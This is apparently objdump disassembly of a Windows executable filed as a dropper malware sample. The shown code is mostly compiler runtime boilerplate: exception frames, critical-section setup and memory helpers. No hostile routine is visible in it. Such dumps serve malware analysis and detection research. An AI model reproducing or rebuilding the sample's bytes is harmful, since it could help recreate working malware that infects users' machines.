
malware_samples/dropper/1fbeb5c772b2e1c7ee65ac50c323f23ee912abd323f5883a148a5f1d28f282b5.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	6a 00                	push   $0x0
  401002:	68 4c 45 44 00       	push   $0x44454c
  401007:	ff 15 fc 51 43 00    	call   *0x4351fc
  40100d:	85 c0                	test   %eax,%eax
  40100f:	75 29                	jne    0x40103a
  401011:	ff 15 f4 51 43 00    	call   *0x4351f4
  401017:	85 c0                	test   %eax,%eax
  401019:	7e 0a                	jle    0x401025
  40101b:	0f b7 c0             	movzwl %ax,%eax
  40101e:	0d 00 00 07 80       	or     $0x80070000,%eax
  401023:	85 c0                	test   %eax,%eax
  401025:	79 13                	jns    0x40103a
  401027:	68 60 4d 43 00       	push   $0x434d60
  40102c:	c6 05 d9 65 44 00 01 	movb   $0x1,0x4465d9
  401033:	e8 ce ce 02 00       	call   0x42df06
  401038:	59                   	pop    %ecx
  401039:	c3                   	ret
  40103a:	68 60 4d 43 00       	push   $0x434d60
  40103f:	c7 05 3c 45 44 00 28 	movl   $0x28,0x44453c
  401046:	00 00 00 
  401049:	e8 b8 ce 02 00       	call   0x42df06
  40104e:	59                   	pop    %ecx
  40104f:	c3                   	ret
  401050:	55                   	push   %ebp
  401051:	8b ec                	mov    %esp,%ebp
  401053:	6a ff                	push   $0xffffffff
  401055:	68 d9 ec 42 00       	push   $0x42ecd9
  40105a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401060:	50                   	push   %eax
  401061:	a1 0c 40 44 00       	mov    0x44400c,%eax
  401066:	33 c5                	xor    %ebp,%eax
  401068:	50                   	push   %eax
  401069:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40106c:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401072:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401079:	6a 00                	push   $0x0
  40107b:	68 84 69 44 00       	push   $0x446984
  401080:	c7 05 80 69 44 00 2c 	movl   $0x2c,0x446980
  401087:	00 00 00 
  40108a:	c7 05 9c 69 44 00 00 	movl   $0x0,0x44699c
  401091:	00 00 00 
  401094:	ff 15 fc 51 43 00    	call   *0x4351fc
  40109a:	85 c0                	test   %eax,%eax
  40109c:	75 27                	jne    0x4010c5
  40109e:	ff 15 f4 51 43 00    	call   *0x4351f4
  4010a4:	85 c0                	test   %eax,%eax
  4010a6:	7e 0a                	jle    0x4010b2
  4010a8:	0f b7 c0             	movzwl %ax,%eax
  4010ab:	0d 00 00 07 80       	or     $0x80070000,%eax
  4010b0:	85 c0                	test   %eax,%eax
  4010b2:	79 11                	jns    0x4010c5
  4010b4:	c6 05 d9 65 44 00 01 	movb   $0x1,0x4465d9
  4010bb:	c7 05 80 69 44 00 00 	movl   $0x0,0x446980
  4010c2:	00 00 00 
  4010c5:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4010cc:	68 d0 4d 43 00       	push   $0x434dd0
  4010d1:	e8 30 ce 02 00       	call   0x42df06
  4010d6:	83 c4 04             	add    $0x4,%esp
  4010d9:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4010dc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4010e3:	59                   	pop    %ecx
  4010e4:	8b e5                	mov    %ebp,%esp
  4010e6:	5d                   	pop    %ebp
  4010e7:	c3                   	ret
  4010e8:	cc                   	int3
  4010e9:	cc                   	int3
  4010ea:	cc                   	int3
  4010eb:	cc                   	int3
  4010ec:	cc                   	int3
  4010ed:	cc                   	int3
  4010ee:	cc                   	int3
  4010ef:	cc                   	int3
  4010f0:	e8 4b 92 01 00       	call   0x41a340
  4010f5:	68 30 4f 43 00       	push   $0x434f30
  4010fa:	e8 07 ce 02 00       	call   0x42df06
  4010ff:	59                   	pop    %ecx
  401100:	c3                   	ret
  401101:	cc                   	int3
  401102:	cc                   	int3
  401103:	cc                   	int3
  401104:	cc                   	int3
  401105:	cc                   	int3
  401106:	cc                   	int3
  401107:	cc                   	int3
  401108:	cc                   	int3
  401109:	cc                   	int3
  40110a:	cc                   	int3
  40110b:	cc                   	int3
  40110c:	cc                   	int3
  40110d:	cc                   	int3
  40110e:	cc                   	int3
  40110f:	cc                   	int3
  401110:	55                   	push   %ebp
  401111:	8b ec                	mov    %esp,%ebp
  401113:	6a ff                	push   $0xffffffff
  401115:	68 ad 39 43 00       	push   $0x4339ad
  40111a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401120:	50                   	push   %eax
  401121:	a1 0c 40 44 00       	mov    0x44400c,%eax
  401126:	33 c5                	xor    %ebp,%eax
  401128:	50                   	push   %eax
  401129:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40112c:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401132:	6a 00                	push   $0x0
  401134:	68 d0 6a 44 00       	push   $0x446ad0
  401139:	c7 05 d4 65 44 00 c0 	movl   $0x446ac0,0x4465d4
  401140:	6a 44 00 
  401143:	ff 15 fc 51 43 00    	call   *0x4351fc
  401149:	85 c0                	test   %eax,%eax
  40114b:	75 1f                	jne    0x40116c
  40114d:	ff 15 f4 51 43 00    	call   *0x4351f4
  401153:	85 c0                	test   %eax,%eax
  401155:	7e 0a                	jle    0x401161
  401157:	0f b7 c0             	movzwl %ax,%eax
  40115a:	0d 00 00 07 80       	or     $0x80070000,%eax
  40115f:	85 c0                	test   %eax,%eax
  401161:	79 09                	jns    0x40116c
  401163:	c6 05 d9 65 44 00 01 	movb   $0x1,0x4465d9
  40116a:	eb 0a                	jmp    0x401176
  40116c:	c7 05 c4 6a 44 00 24 	movl   $0x24,0x446ac4
  401173:	00 00 00 
  401176:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40117d:	c7 05 c0 6a 44 00 a0 	movl   $0x437da0,0x446ac0
  401184:	7d 43 00 
  401187:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  40118e:	c7 05 c0 6a 44 00 60 	movl   $0x437e60,0x446ac0
  401195:	7e 43 00 
  401198:	c7 05 f0 6a 44 00 00 	movl   $0x0,0x446af0
  40119f:	00 00 00 
  4011a2:	c7 05 f4 6a 44 00 00 	movl   $0x0,0x446af4
  4011a9:	00 00 00 
  4011ac:	c7 05 f8 6a 44 00 00 	movl   $0x0,0x446af8
  4011b3:	00 00 00 
  4011b6:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  4011bd:	c7 05 c0 6a 44 00 8c 	movl   $0x437e8c,0x446ac0
  4011c4:	7e 43 00 
  4011c7:	c7 05 fc 6a 44 00 00 	movl   $0x0,0x446afc
  4011ce:	00 00 00 
  4011d1:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4011d8:	68 40 4f 43 00       	push   $0x434f40
  4011dd:	e8 24 cd 02 00       	call   0x42df06
  4011e2:	83 c4 04             	add    $0x4,%esp
  4011e5:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4011e8:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4011ef:	59                   	pop    %ecx
  4011f0:	8b e5                	mov    %ebp,%esp
  4011f2:	5d                   	pop    %ebp
  4011f3:	c3                   	ret
  4011f4:	b9 c0 61 44 00       	mov    $0x4461c0,%ecx
  4011f9:	e8 de c3 02 00       	call   0x42d5dc
  4011fe:	68 93 4f 43 00       	push   $0x434f93
  401203:	e8 fe cc 02 00       	call   0x42df06
  401208:	59                   	pop    %ecx
  401209:	c3                   	ret
  40120a:	cc                   	int3
  40120b:	cc                   	int3
  40120c:	cc                   	int3
  40120d:	cc                   	int3
  40120e:	cc                   	int3
  40120f:	cc                   	int3
  401210:	55                   	push   %ebp
  401211:	8b ec                	mov    %esp,%ebp
  401213:	6a 00                	push   $0x0
  401215:	6a 00                	push   $0x0
  401217:	ff 75 0c             	push   0xc(%ebp)
  40121a:	ff 75 08             	push   0x8(%ebp)
  40121d:	ff 15 ec 51 43 00    	call   *0x4351ec
  401223:	5d                   	pop    %ebp
  401224:	c3                   	ret
  401225:	cc                   	int3
  401226:	cc                   	int3
  401227:	cc                   	int3
  401228:	cc                   	int3
  401229:	cc                   	int3
  40122a:	cc                   	int3
  40122b:	cc                   	int3
  40122c:	cc                   	int3
  40122d:	cc                   	int3
  40122e:	cc                   	int3
  40122f:	cc                   	int3
  401230:	6a 00                	push   $0x0
  401232:	51                   	push   %ecx
  401233:	ff 15 fc 51 43 00    	call   *0x4351fc
  401239:	85 c0                	test   %eax,%eax
  40123b:	75 13                	jne    0x401250
  40123d:	ff 15 f4 51 43 00    	call   *0x4351f4
  401243:	85 c0                	test   %eax,%eax
  401245:	7e 0b                	jle    0x401252
  401247:	0f b7 c0             	movzwl %ax,%eax
  40124a:	0d 00 00 07 80       	or     $0x80070000,%eax
  40124f:	c3                   	ret
  401250:	33 c0                	xor    %eax,%eax
  401252:	c3                   	ret
  401253:	cc                   	int3
  401254:	cc                   	int3
  401255:	cc                   	int3
  401256:	cc                   	int3
  401257:	cc                   	int3
  401258:	cc                   	int3
  401259:	cc                   	int3
  40125a:	cc                   	int3
  40125b:	cc                   	int3
  40125c:	cc                   	int3
  40125d:	cc                   	int3
  40125e:	cc                   	int3
  40125f:	cc                   	int3
  401260:	55                   	push   %ebp
  401261:	8b ec                	mov    %esp,%ebp
  401263:	6a ff                	push   $0xffffffff
  401265:	68 a0 ec 42 00       	push   $0x42eca0
  40126a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401270:	50                   	push   %eax
  401271:	51                   	push   %ecx
  401272:	56                   	push   %esi
  401273:	a1 0c 40 44 00       	mov    0x44400c,%eax
  401278:	33 c5                	xor    %ebp,%eax
  40127a:	50                   	push   %eax
  40127b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40127e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401284:	8b f1                	mov    %ecx,%esi
  401286:	89 75 f0             	mov    %esi,-0x10(%ebp)
  401289:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401290:	8b 46 20             	mov    0x20(%esi),%eax
  401293:	85 c0                	test   %eax,%eax
  401295:	74 11                	je     0x4012a8
  401297:	50                   	push   %eax
  401298:	ff 15 28 54 43 00    	call   *0x435428
  40129e:	83 c4 04             	add    $0x4,%esp
  4012a1:	c7 46 20 00 00 00 00 	movl   $0x0,0x20(%esi)
  4012a8:	c7 46 28 00 00 00 00 	movl   $0x0,0x28(%esi)
  4012af:	c7 46 24 00 00 00 00 	movl   $0x0,0x24(%esi)
  4012b6:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4012b9:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4012c0:	59                   	pop    %ecx
  4012c1:	5e                   	pop    %esi
  4012c2:	8b e5                	mov    %ebp,%esp
  4012c4:	5d                   	pop    %ebp
  4012c5:	c3                   	ret
  4012c6:	cc                   	int3
  4012c7:	cc                   	int3
  4012c8:	cc                   	int3
  4012c9:	cc                   	int3
  4012ca:	cc                   	int3
  4012cb:	cc                   	int3
  4012cc:	cc                   	int3
  4012cd:	cc                   	int3
  4012ce:	cc                   	int3
  4012cf:	cc                   	int3
  4012d0:	55                   	push   %ebp
  4012d1:	8b ec                	mov    %esp,%ebp
  4012d3:	ff 75 08             	push   0x8(%ebp)
  4012d6:	6a 00                	push   $0x0
  4012d8:	ff 71 04             	push   0x4(%ecx)
  4012db:	ff 15 e8 51 43 00    	call   *0x4351e8
  4012e1:	5d                   	pop    %ebp
  4012e2:	c2 04 00             	ret    $0x4
  4012e5:	cc                   	int3
  4012e6:	cc                   	int3
  4012e7:	cc                   	int3
  4012e8:	cc                   	int3
  4012e9:	cc                   	int3
  4012ea:	cc                   	int3
  4012eb:	cc                   	int3
  4012ec:	cc                   	int3
  4012ed:	cc                   	int3
  4012ee:	cc                   	int3
  4012ef:	cc                   	int3
  4012f0:	55                   	push   %ebp
  4012f1:	8b ec                	mov    %esp,%ebp
  4012f3:	8b 45 08             	mov    0x8(%ebp),%eax
  4012f6:	85 c0                	test   %eax,%eax
  4012f8:	74 0c                	je     0x401306
  4012fa:	50                   	push   %eax
  4012fb:	6a 00                	push   $0x0
  4012fd:	ff 71 04             	push   0x4(%ecx)
  401300:	ff 15 94 51 43 00    	call   *0x435194
  401306:	5d                   	pop    %ebp
  401307:	c2 04 00             	ret    $0x4
  40130a:	cc                   	int3
  40130b:	cc                   	int3
  40130c:	cc                   	int3
  40130d:	cc                   	int3
  40130e:	cc                   	int3
  40130f:	cc                   	int3
  401310:	55                   	push   %ebp
  401311:	8b ec                	mov    %esp,%ebp
  401313:	8b 55 08             	mov    0x8(%ebp),%edx
  401316:	85 d2                	test   %edx,%edx
  401318:	75 0b                	jne    0x401325
  40131a:	8b 01                	mov    (%ecx),%eax
  40131c:	ff 75 0c             	push   0xc(%ebp)
  40131f:	ff 10                	call   *(%eax)
  401321:	5d                   	pop    %ebp
  401322:	c2 08 00             	ret    $0x8
  401325:	8b 45 0c             	mov    0xc(%ebp),%eax
  401328:	85 c0                	test   %eax,%eax
  40132a:	75 0c                	jne    0x401338
  40132c:	8b 01                	mov    (%ecx),%eax
  40132e:	52                   	push   %edx
  40132f:	ff 50 04             	call   *0x4(%eax)
  401332:	33 c0                	xor    %eax,%eax
  401334:	5d                   	pop    %ebp
  401335:	c2 08 00             	ret    $0x8
  401338:	50                   	push   %eax
  401339:	52                   	push   %edx
  40133a:	6a 00                	push   $0x0
  40133c:	ff 71 04             	push   0x4(%ecx)
  40133f:	ff 15 f0 51 43 00    	call   *0x4351f0
  401345:	5d                   	pop    %ebp
  401346:	c2 08 00             	ret    $0x8
  401349:	cc                   	int3
  40134a:	cc                   	int3
  40134b:	cc                   	int3
  40134c:	cc                   	int3
  40134d:	cc                   	int3
  40134e:	cc                   	int3
  40134f:	cc                   	int3
  401350:	55                   	push   %ebp
  401351:	8b ec                	mov    %esp,%ebp
  401353:	ff 75 08             	push   0x8(%ebp)
  401356:	6a 00                	push   $0x0
  401358:	ff 71 04             	push   0x4(%ecx)
  40135b:	ff 15 f8 51 43 00    	call   *0x4351f8
  401361:	5d                   	pop    %ebp
  401362:	c2 04 00             	ret    $0x4
  401365:	cc                   	int3
  401366:	cc                   	int3
  401367:	cc                   	int3
  401368:	cc                   	int3
  401369:	cc                   	int3
  40136a:	cc                   	int3
  40136b:	cc                   	int3
  40136c:	cc                   	int3
  40136d:	cc                   	int3
  40136e:	cc                   	int3
  40136f:	cc                   	int3
  401370:	55                   	push   %ebp
  401371:	8b ec                	mov    %esp,%ebp
  401373:	56                   	push   %esi
  401374:	8b f1                	mov    %ecx,%esi
  401376:	80 7e 08 00          	cmpb   $0x0,0x8(%esi)
  40137a:	c7 06 28 58 43 00    	movl   $0x435828,(%esi)
  401380:	74 0e                	je     0x401390
  401382:	8b 46 04             	mov    0x4(%esi),%eax
  401385:	85 c0                	test   %eax,%eax
  401387:	74 07                	je     0x401390
  401389:	50                   	push   %eax
  40138a:	ff 15 e0 51 43 00    	call   *0x4351e0
  401390:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  401394:	74 0b                	je     0x4013a1
  401396:	6a 0c                	push   $0xc
  401398:	56                   	push   %esi
  401399:	e8 7d cb 02 00       	call   0x42df1b
  40139e:	83 c4 08             	add    $0x8,%esp
  4013a1:	8b c6                	mov    %esi,%eax
  4013a3:	5e                   	pop    %esi
  4013a4:	5d                   	pop    %ebp
  4013a5:	c2 04 00             	ret    $0x4
  4013a8:	cc                   	int3
  4013a9:	cc                   	int3
  4013aa:	cc                   	int3
  4013ab:	cc                   	int3
  4013ac:	cc                   	int3
  4013ad:	cc                   	int3
  4013ae:	cc                   	int3
  4013af:	cc                   	int3
  4013b0:	55                   	push   %ebp
  4013b1:	8b ec                	mov    %esp,%ebp
  4013b3:	6a ff                	push   $0xffffffff
  4013b5:	68 5d ed 42 00       	push   $0x42ed5d
  4013ba:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4013c0:	50                   	push   %eax
  4013c1:	56                   	push   %esi
  4013c2:	a1 0c 40 44 00       	mov    0x44400c,%eax
  4013c7:	33 c5                	xor    %ebp,%eax
  4013c9:	50                   	push   %eax
  4013ca:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4013cd:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4013d3:	64 a1 2c 00 00 00    	mov    %fs:0x2c,%eax
  4013d9:	8b 30                	mov    (%eax),%esi
  4013db:	a1 c4 65 44 00       	mov    0x4465c4,%eax
  4013e0:	3b 86 04 00 00 00    	cmp    0x4(%esi),%eax
  4013e6:	7f 22                	jg     0x40140a
  4013e8:	a1 c0 65 44 00       	mov    0x4465c0,%eax
  4013ed:	3b 86 04 00 00 00    	cmp    0x4(%esi),%eax
  4013f3:	7f 6e                	jg     0x401463
  4013f5:	b8 a4 65 44 00       	mov    $0x4465a4,%eax
  4013fa:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4013fd:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401404:	59                   	pop    %ecx
  401405:	5e                   	pop    %esi
  401406:	8b e5                	mov    %ebp,%esp
  401408:	5d                   	pop    %ebp
  401409:	c3                   	ret
  40140a:	68 c4 65 44 00       	push   $0x4465c4
  40140f:	e8 e0 c7 02 00       	call   0x42dbf4
  401414:	83 c4 04             	add    $0x4,%esp
  401417:	83 3d c4 65 44 00 ff 	cmpl   $0xffffffff,0x4465c4
  40141e:	75 c8                	jne    0x4013e8
  401420:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401427:	ff 15 d8 51 43 00    	call   *0x4351d8
  40142d:	68 00 4f 43 00       	push   $0x434f00
  401432:	c7 05 c8 65 44 00 28 	movl   $0x435828,0x4465c8
  401439:	58 43 00 
  40143c:	a3 cc 65 44 00       	mov    %eax,0x4465cc
  401441:	c6 05 d0 65 44 00 00 	movb   $0x0,0x4465d0
  401448:	e8 b9 ca 02 00       	call   0x42df06
  40144d:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  401454:	68 c4 65 44 00       	push   $0x4465c4
  401459:	e8 4c c7 02 00       	call   0x42dbaa
  40145e:	83 c4 08             	add    $0x8,%esp
  401461:	eb 85                	jmp    0x4013e8
  401463:	68 c0 65 44 00       	push   $0x4465c0
  401468:	e8 87 c7 02 00       	call   0x42dbf4
  40146d:	83 c4 04             	add    $0x4,%esp
  401470:	83 3d c0 65 44 00 ff 	cmpl   $0xffffffff,0x4465c0
  401477:	0f 85 78 ff ff ff    	jne    0x4013f5
  40147d:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401484:	33 c0                	xor    %eax,%eax
  401486:	68 f0 4e 43 00       	push   $0x434ef0
  40148b:	c7 05 a4 65 44 00 40 	movl   $0x435840,0x4465a4
  401492:	58 43 00 
  401495:	c7 05 a8 65 44 00 c8 	movl   $0x4465c8,0x4465a8
  40149c:	65 44 00 
  40149f:	c7 05 b8 65 44 00 02 	movl   $0x2,0x4465b8
  4014a6:	00 00 00 
  4014a9:	c7 05 b0 65 44 00 00 	movl   $0x0,0x4465b0
  4014b0:	00 00 00 
  4014b3:	c7 05 b4 65 44 00 00 	movl   $0x0,0x4465b4
  4014ba:	00 00 00 
  4014bd:	a3 bc 65 44 00       	mov    %eax,0x4465bc
  4014c2:	c7 05 ac 65 44 00 a4 	movl   $0x4465a4,0x4465ac
  4014c9:	65 44 00 
  4014cc:	e8 35 ca 02 00       	call   0x42df06
  4014d1:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4014d8:	68 c0 65 44 00       	push   $0x4465c0
  4014dd:	e8 c8 c6 02 00       	call   0x42dbaa
  4014e2:	83 c4 08             	add    $0x8,%esp
  4014e5:	e9 0b ff ff ff       	jmp    0x4013f5
  4014ea:	cc                   	int3
  4014eb:	cc                   	int3
  4014ec:	cc                   	int3
  4014ed:	cc                   	int3
  4014ee:	cc                   	int3
  4014ef:	cc                   	int3
  4014f0:	55                   	push   %ebp
  4014f1:	8b ec                	mov    %esp,%ebp
  4014f3:	8b 55 08             	mov    0x8(%ebp),%edx
  4014f6:	56                   	push   %esi
  4014f7:	57                   	push   %edi
  4014f8:	8b f9                	mov    %ecx,%edi
  4014fa:	85 d2                	test   %edx,%edx
  4014fc:	78 57                	js     0x401555
  4014fe:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401503:	2b c2                	sub    %edx,%eax
  401505:	83 f8 01             	cmp    $0x1,%eax
  401508:	7c 4b                	jl     0x401555
  40150a:	42                   	inc    %edx
  40150b:	8d 72 07             	lea    0x7(%edx),%esi
  40150e:	83 e6 f8             	and    $0xfffffff8,%esi
  401511:	3b d6                	cmp    %esi,%edx
  401513:	7f 40                	jg     0x401555
  401515:	8b c6                	mov    %esi,%eax
  401517:	f7 65 0c             	mull   0xc(%ebp)
  40151a:	85 d2                	test   %edx,%edx
  40151c:	77 37                	ja     0x401555
  40151e:	72 05                	jb     0x401525
  401520:	83 f8 ff             	cmp    $0xffffffff,%eax
  401523:	77 30                	ja     0x401555
  401525:	83 f8 ef             	cmp    $0xffffffef,%eax
  401528:	77 2b                	ja     0x401555
  40152a:	8b 4f 04             	mov    0x4(%edi),%ecx
  40152d:	8d 50 10             	lea    0x10(%eax),%edx
  401530:	52                   	push   %edx
  401531:	8b 01                	mov    (%ecx),%eax
  401533:	ff 10                	call   *(%eax)
  401535:	85 c0                	test   %eax,%eax
  401537:	74 1c                	je     0x401555
  401539:	89 38                	mov    %edi,(%eax)
  40153b:	8d 4e ff             	lea    -0x1(%esi),%ecx
  40153e:	5f                   	pop    %edi
  40153f:	c7 40 0c 01 00 00 00 	movl   $0x1,0xc(%eax)
  401546:	89 48 08             	mov    %ecx,0x8(%eax)
  401549:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  401550:	5e                   	pop    %esi
  401551:	5d                   	pop    %ebp
  401552:	c2 08 00             	ret    $0x8
  401555:	5f                   	pop    %edi
  401556:	33 c0                	xor    %eax,%eax
  401558:	5e                   	pop    %esi
  401559:	5d                   	pop    %ebp
  40155a:	c2 08 00             	ret    $0x8
  40155d:	cc                   	int3
  40155e:	cc                   	int3
  40155f:	cc                   	int3
  401560:	55                   	push   %ebp
  401561:	8b ec                	mov    %esp,%ebp
  401563:	8b 49 04             	mov    0x4(%ecx),%ecx
  401566:	8b 01                	mov    (%ecx),%eax
  401568:	5d                   	pop    %ebp
  401569:	ff 60 04             	jmp    *0x4(%eax)
  40156c:	cc                   	int3
  40156d:	cc                   	int3
  40156e:	cc                   	int3
  40156f:	cc                   	int3
  401570:	55                   	push   %ebp
  401571:	8b ec                	mov    %esp,%ebp
  401573:	8b 55 0c             	mov    0xc(%ebp),%edx
  401576:	56                   	push   %esi
  401577:	85 d2                	test   %edx,%edx
  401579:	78 4a                	js     0x4015c5
  40157b:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401580:	2b c2                	sub    %edx,%eax
  401582:	83 f8 01             	cmp    $0x1,%eax
  401585:	7c 3e                	jl     0x4015c5
  401587:	42                   	inc    %edx
  401588:	8d 72 07             	lea    0x7(%edx),%esi
  40158b:	83 e6 f8             	and    $0xfffffff8,%esi
  40158e:	3b d6                	cmp    %esi,%edx
  401590:	7f 33                	jg     0x4015c5
  401592:	8b c6                	mov    %esi,%eax
  401594:	f7 65 10             	mull   0x10(%ebp)
  401597:	85 d2                	test   %edx,%edx
  401599:	77 2a                	ja     0x4015c5
  40159b:	72 05                	jb     0x4015a2
  40159d:	83 f8 ff             	cmp    $0xffffffff,%eax
  4015a0:	77 23                	ja     0x4015c5
  4015a2:	83 f8 ef             	cmp    $0xffffffef,%eax
  4015a5:	77 1e                	ja     0x4015c5
  4015a7:	8b 49 04             	mov    0x4(%ecx),%ecx
  4015aa:	83 c0 10             	add    $0x10,%eax
  4015ad:	50                   	push   %eax
  4015ae:	ff 75 08             	push   0x8(%ebp)
  4015b1:	8b 11                	mov    (%ecx),%edx
  4015b3:	ff 52 08             	call   *0x8(%edx)
  4015b6:	85 c0                	test   %eax,%eax
  4015b8:	74 0b                	je     0x4015c5
  4015ba:	8d 4e ff             	lea    -0x1(%esi),%ecx
  4015bd:	89 48 08             	mov    %ecx,0x8(%eax)
  4015c0:	5e                   	pop    %esi
  4015c1:	5d                   	pop    %ebp
  4015c2:	c2 0c 00             	ret    $0xc
  4015c5:	33 c0                	xor    %eax,%eax
  4015c7:	5e                   	pop    %esi
  4015c8:	5d                   	pop    %ebp
  4015c9:	c2 0c 00             	ret    $0xc
  4015cc:	cc                   	int3
  4015cd:	cc                   	int3
  4015ce:	cc                   	int3
  4015cf:	cc                   	int3
  4015d0:	f0 ff 41 14          	lock incl 0x14(%ecx)
  4015d4:	8d 41 08             	lea    0x8(%ecx),%eax
  4015d7:	c3                   	ret
  4015d8:	cc                   	int3
  4015d9:	cc                   	int3
  4015da:	cc                   	int3
  4015db:	cc                   	int3
  4015dc:	cc                   	int3
  4015dd:	cc                   	int3
  4015de:	cc                   	int3
  4015df:	cc                   	int3
  4015e0:	8b c1                	mov    %ecx,%eax
  4015e2:	c3                   	ret
  4015e3:	cc                   	int3
  4015e4:	cc                   	int3
  4015e5:	cc                   	int3
  4015e6:	cc                   	int3
  4015e7:	cc                   	int3
  4015e8:	cc                   	int3
  4015e9:	cc                   	int3
  4015ea:	cc                   	int3
  4015eb:	cc                   	int3
  4015ec:	cc                   	int3
  4015ed:	cc                   	int3
  4015ee:	cc                   	int3
  4015ef:	cc                   	int3
  4015f0:	55                   	push   %ebp
  4015f1:	8b ec                	mov    %esp,%ebp
  4015f3:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  4015f7:	56                   	push   %esi
  4015f8:	8b f1                	mov    %ecx,%esi
  4015fa:	c7 06 40 58 43 00    	movl   $0x435840,(%esi)
  401600:	74 0b                	je     0x40160d
  401602:	6a 1c                	push   $0x1c
  401604:	56                   	push   %esi
  401605:	e8 11 c9 02 00       	call   0x42df1b
  40160a:	83 c4 08             	add    $0x8,%esp
  40160d:	8b c6                	mov    %esi,%eax
  40160f:	5e                   	pop    %esi
  401610:	5d                   	pop    %ebp
  401611:	c2 04 00             	ret    $0x4
  401614:	cc                   	int3
  401615:	cc                   	int3
  401616:	cc                   	int3
  401617:	cc                   	int3
  401618:	cc                   	int3
  401619:	cc                   	int3
  40161a:	cc                   	int3
  40161b:	cc                   	int3
  40161c:	cc                   	int3
  40161d:	cc                   	int3
  40161e:	cc                   	int3
  40161f:	cc                   	int3
  401620:	55                   	push   %ebp
  401621:	8b ec                	mov    %esp,%ebp
  401623:	6a ff                	push   $0xffffffff
  401625:	68 80 ed 42 00       	push   $0x42ed80
  40162a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401630:	50                   	push   %eax
  401631:	56                   	push   %esi
  401632:	a1 0c 40 44 00       	mov    0x44400c,%eax
  401637:	33 c5                	xor    %ebp,%eax
  401639:	50                   	push   %eax
  40163a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40163d:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401643:	8b f1                	mov    %ecx,%esi
  401645:	8b 06                	mov    (%esi),%eax
  401647:	85 c0                	test   %eax,%eax
  401649:	74 10                	je     0x40165b
  40164b:	50                   	push   %eax
  40164c:	ff 15 28 54 43 00    	call   *0x435428
  401652:	83 c4 04             	add    $0x4,%esp
  401655:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  40165b:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  401662:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  401669:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40166c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401673:	59                   	pop    %ecx
  401674:	5e                   	pop    %esi
  401675:	8b e5                	mov    %ebp,%esp
  401677:	5d                   	pop    %ebp
  401678:	c3                   	ret
  401679:	cc                   	int3
  40167a:	cc                   	int3
  40167b:	cc                   	int3
  40167c:	cc                   	int3
  40167d:	cc                   	int3
  40167e:	cc                   	int3
  40167f:	cc                   	int3
  401680:	c2 00 00             	ret    $0x0
  401683:	cc                   	int3
  401684:	cc                   	int3
  401685:	cc                   	int3
  401686:	cc                   	int3
  401687:	cc                   	int3
  401688:	cc                   	int3
  401689:	cc                   	int3
  40168a:	cc                   	int3
  40168b:	cc                   	int3
  40168c:	cc                   	int3
  40168d:	cc                   	int3
  40168e:	cc                   	int3
  40168f:	cc                   	int3
  401690:	8b 41 0c             	mov    0xc(%ecx),%eax
  401693:	85 c0                	test   %eax,%eax
  401695:	75 0d                	jne    0x4016a4
  401697:	39 41 24             	cmp    %eax,0x24(%ecx)
  40169a:	b8 c0 57 43 00       	mov    $0x4357c0,%eax
  40169f:	74 03                	je     0x4016a4
  4016a1:	8b 41 1c             	mov    0x1c(%ecx),%eax
  4016a4:	50                   	push   %eax
  4016a5:	ff 15 3c 52 43 00    	call   *0x43523c
  4016ab:	c3                   	ret
  4016ac:	cc                   	int3
  4016ad:	cc                   	int3
  4016ae:	cc                   	int3
  4016af:	cc                   	int3
  4016b0:	55                   	push   %ebp
  4016b1:	8b ec                	mov    %esp,%ebp
  4016b3:	83 ec 3c             	sub    $0x3c,%esp
  4016b6:	8b 41 0c             	mov    0xc(%ecx),%eax
  4016b9:	0f 57 c0             	xorps  %xmm0,%xmm0
  4016bc:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  4016c3:	66 0f 13 45 d8       	movlpd %xmm0,-0x28(%ebp)
